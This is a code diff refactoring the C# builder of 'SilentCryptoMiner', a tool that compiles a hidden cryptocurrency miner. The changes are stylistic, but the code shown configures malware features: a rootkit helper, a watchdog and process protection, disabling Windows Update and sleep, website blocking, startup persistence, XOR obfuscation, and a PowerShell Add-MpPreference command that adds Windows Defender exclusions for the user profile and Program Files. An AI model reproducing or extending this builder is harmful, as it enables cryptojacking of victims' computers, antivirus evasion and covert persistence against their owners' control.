@@ -1,13 +1,13 @@
-﻿using System;
+﻿using Microsoft.CSharp;
+using SilentCryptoMiner.Program;
+using System;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.IO.Compression;
 using System.Linq;
 using System.Text;
 using System.Windows.Forms;
-using Microsoft.CSharp;
 
 namespace SilentCryptoMiner
 {
@@ -34,19 +34,12 @@ namespace SilentCryptoMiner
                     { "filename", Path.Combine(currentDirectory, filename) }
                 };
 
-                if (F.BuildError(currentDirectory.Contains(" "), string.Format("Error: Build path \"{0}\" contains a space in its path, spaces are not allowed in some of the compiler programs. Please choose another build location without a space in its path.", savePath)))
-                    return false;
                 var directoryFilter = F.CheckNonASCII(savePath);
-                if (F.BuildError(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following possible illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))))
-                    return false;
-                if (F.BuildError(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number."))
-                    return false;
-
-                if (F.BuildError(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
+                if (F.BuildError(currentDirectory.Contains(" "), string.Format("Error: Build path \"{0}\" contains a space in its path, spaces are not allowed in some of the compiler programs. Please choose another build location without a space in its path.", savePath)) || F.BuildError(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following possible illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))) || F.BuildError(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number.") || F.BuildError(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
                     return false;
 
                 var resource = new StringBuilder(Properties.Resources.resource);
-                string defs = "";
+                string defs = string.Empty;
                 if (!string.IsNullOrEmpty(icoPath))
                 {
                     resource.Replace("#ICON", F.ToLiteral(icoPath));
@@ -55,6 +48,7 @@ namespace SilentCryptoMiner
 
                 if (assemblyData)
                 {
+                    //You can do the resource replace in 1 line by joining all the .Replace
                     resource.Replace("#TITLE", F.ToLiteral(F.txtAssemblyTitle.Text));
                     resource.Replace("#DESCRIPTION", F.ToLiteral(F.txtAssemblyDescription.Text));
                     resource.Replace("#COMPANY", F.ToLiteral(F.txtAssemblyCompany.Text));
@@ -69,8 +63,7 @@ namespace SilentCryptoMiner
 
                 File.WriteAllText(paths["resource.rc"], resource.ToString());
                 RunExternalProgram(paths["windres"], string.Format("--input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
-                File.Delete(paths["resource.rc"]);
-                File.Delete(paths["manifest"]);
+                Utils.deleteFiles(new string[] { paths["resource.rc"], paths["manifest"] });
                 if (F.BuildError(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
                     return false;
 
@@ -81,15 +74,12 @@ namespace SilentCryptoMiner
 
                 File.WriteAllText(paths["filename"] + ".cpp", maincode.ToString());
                 RunExternalProgram(paths["g++"], compilerCommand, currentDirectory, paths["g++log"]);
-                File.Delete(paths["resource.o"]);
-                File.Delete(paths["filename"] + ".cpp");
+                Utils.deleteFiles(new string[] { paths["resource.o"], paths["filename"] + ".cpp" });
                 if (F.BuildError(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["g++log"])))
                     return false;
 
                 if (F.FormAO.toggleRootkit.Checked)
-                {
                     MakeRootkitHelper(savePath);
-                }
             }
             catch (Exception ex)
             {
@@ -101,10 +91,7 @@ namespace SilentCryptoMiner
 
         public static bool CheckerCompiler(string savePath)
         {
-            var providerOptions = new Dictionary<string, string>
-            {
-                { "CompilerVersion", "v4.0" }
-            };
+            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
             var codeProvider = new CSharpCodeProvider(providerOptions);
             var parameters = new CompilerParameters();
             string OP = " /target:exe /platform:x64 /optimize ";
@@ -133,25 +120,20 @@ namespace SilentCryptoMiner
             if (results.Errors.HasErrors)
             {
                 foreach (CompilerError E in results.Errors)
-                {
                     MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
+
                 return false;
             }
 
             if (F.FormAO.toggleRootkit.Checked)
-            {
                 MakeRootkitHelper(savePath);
-            }
+
             return true;
         }
 
         public static bool UninstallerCompiler(string savePath)
         {
-            var providerOptions = new Dictionary<string, string>
-            {
-                { "CompilerVersion", "v4.0" }
-            };
+            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
             var codeProvider = new CSharpCodeProvider(providerOptions);
             var parameters = new CompilerParameters();
             string OP = " /target:winexe /platform:x64 /optimize ";
@@ -186,24 +168,21 @@ namespace SilentCryptoMiner
 
             try
             {
-                File.Delete(savePath + ".manifest");
-                File.Delete("uninstaller.Resources");
+                Utils.deleteFiles(new string[] { savePath + ".manifest", "uninstaller.Resources" });
             }
             catch { }
 
             if (results.Errors.HasErrors)
             {
                 foreach (CompilerError E in results.Errors)
-                {
                     MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
+
                 return false;
             }
 
             if (F.FormAO.toggleRootkit.Checked)
-            {
                 MakeRootkitHelper(savePath);
-            }
+
             return true;
         }
 
@@ -227,9 +206,8 @@ namespace SilentCryptoMiner
                 process.Start();
 
                 using (StreamWriter writer = File.AppendText(logpath))
-                {
                     writer.Write(process.StandardError.ReadToEnd());
-                }
+
                 process.WaitForExit();
             }
         }
@@ -254,9 +232,8 @@ namespace SilentCryptoMiner
         {
             byte[] result = new byte[data.Length];
             for (int i = 0; i < data.Length; i++)
-            {
                 result[i] = (byte)(data[i] ^ key[i % key.Length]);
-            }
+
             return result;
         }
 
@@ -278,15 +255,11 @@ namespace SilentCryptoMiner
                 stringb.Replace("DefGPU", "true");
 
                 if (F.xmrGPU)
-                {
                     stringb.Replace("DefXMRGPU", "true");
-                }
             }
 
             if (F.mineXMR)
-            {
                 stringb.Replace("DefXMR", "true");
-            }
 
             if (F.toggleWDExclusions.Checked)
             {
@@ -294,25 +267,13 @@ namespace SilentCryptoMiner
                 stringb.Replace("#WDCOMMAND", $"powershell Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force");
             }
 
-            if (F.FormAO.toggleRootkit.Checked)
-            {
-                stringb.Replace("DefRootkit", "true");
-            }
+            if (F.FormAO.toggleRootkit.Checked) stringb.Replace("DefRootkit", "true");
 
-            if (F.toggleDisableSleep.Checked)
-            {
-                stringb.Replace("DefDisableSleep", "true");
-            }
+            if (F.toggleDisableSleep.Checked) stringb.Replace("DefDisableSleep", "true");
 
-            if (F.toggleWindowsUpdate.Checked)
-            {
-                stringb.Replace("DefDisableWindowsUpdate", "true");
-            }
+            if (F.toggleWindowsUpdate.Checked) stringb.Replace("DefDisableWindowsUpdate", "true");
 
-            if (F.toggleProcessProtect.Checked)
-            {
-                stringb.Replace("DefProcessProtect", "true");
-            }
+            if (F.toggleProcessProtect.Checked) stringb.Replace("DefProcessProtect", "true");
 
             if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
             {
@@ -372,20 +333,11 @@ namespace SilentCryptoMiner
 
                 stringb.Replace("#STARTUPFILE", @"\\" + F.txtStartupFileName.Text.Replace(@"\", @"\\"));
 
-                if (F.toggleWatchdog.Checked)
-                {
-                    stringb.Replace("DefWatchdog", "true");
-                }
+                if (F.toggleWatchdog.Checked) stringb.Replace("DefWatchdog", "true");
 
-                if (F.toggleAutoDelete.Checked)
-                {
-                    stringb.Replace("DefAutoDelete", "true");
-                }
+                if (F.toggleAutoDelete.Checked) stringb.Replace("DefAutoDelete", "true");
 
-                if (F.FormAO.toggleRunInstall.Checked)
-                {
-                    stringb.Replace("DefRunInstall", "true");
-                }
+                if (F.FormAO.toggleRunInstall.Checked) stringb.Replace("DefRunInstall", "true");
             }
 
             stringb.Replace("$CSLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
